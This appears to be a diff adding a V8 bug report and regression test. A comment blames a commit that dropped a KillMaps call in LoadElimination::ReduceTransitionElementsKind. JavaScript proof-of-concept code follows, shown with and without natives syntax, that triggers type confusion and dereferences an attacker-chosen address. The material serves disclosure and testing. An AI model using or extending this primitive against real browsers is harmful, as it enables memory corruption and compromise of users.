@@ -1,0 +1,73 @@
+/*
+I think this commit has introduced the bug: https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b
+
+Reduction LoadElimination::ReduceTransitionElementsKind(Node* node) {
+...
+     if (object_maps.contains(ZoneHandleSet<Map>(source_map))) {
+       object_maps.remove(source_map, zone());
+       object_maps.insert(target_map, zone());
+-      AliasStateInfo alias_info(state, object, source_map);
+-      state = state->KillMaps(alias_info, zone());
+-      state = state->AddMaps(object, object_maps, zone());
++      state = state->SetMaps(object, object_maps, zone());
+     }
+...
+}
+
+I think the "state->KillMaps(alias_info, zone());" was accidentally removed. This lack may lead CheckMap instructions to be removed incorrectly.
+
+A PoC demonstrating type confusion:
+*/
+
+function opt(a, b) {
+    b[0] = 0;
+
+    a.length;
+
+    // TransitionElementsKind
+    for (let i = 0; i < 1; i++)
+        a[0] = 0;
+
+    // CheckMap removed, type confusion
+    b[0] = 9.431092e-317;  // 0x1234567
+}
+
+let arr1 = new Array(1);
+arr1[0] = 'a';
+opt(arr1, [0]);
+
+let arr2 = [0.1];
+opt(arr2, arr2);
+
+%OptimizeFunctionOnNextCall(opt);
+
+opt(arr2, arr2);
+arr2[0].x  // access 0x1234566
+
+Without natives syntax:
+function opt(a, b) {
+    b[0] = 0;
+
+    a.length;
+
+    // TransitionElementsKind
+    for (let i = 0; i < 1; i++)
+        a[0] = 0;
+
+    b[0] = 9.431092e-317;  // 0x1234567
+
+    // Force optimization
+    for (let i = 0; i < 10000000; i++) {
+
+    }
+}
+
+let arr1 = new Array(1);
+arr1[0] = 'a';
+opt(arr1, [0]);
+
+let arr2 = [0.1];
+opt(arr2, arr2);
+
+opt(arr2, arr2);
+arr2[0].x  // access 0x1234566
